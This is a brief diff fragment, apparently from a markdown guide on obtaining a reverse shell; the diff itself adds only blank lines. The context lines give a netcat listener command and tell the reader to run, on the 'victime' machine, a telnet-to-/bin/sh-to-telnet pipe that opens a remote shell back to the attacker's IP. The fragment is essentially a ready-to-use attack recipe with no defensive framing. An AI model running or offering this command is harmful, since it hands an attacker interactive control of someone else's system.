@@ -19,3 +19,5 @@ nc -lvp 8081
 In Victime machine run below command:
 telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 ```
+
+
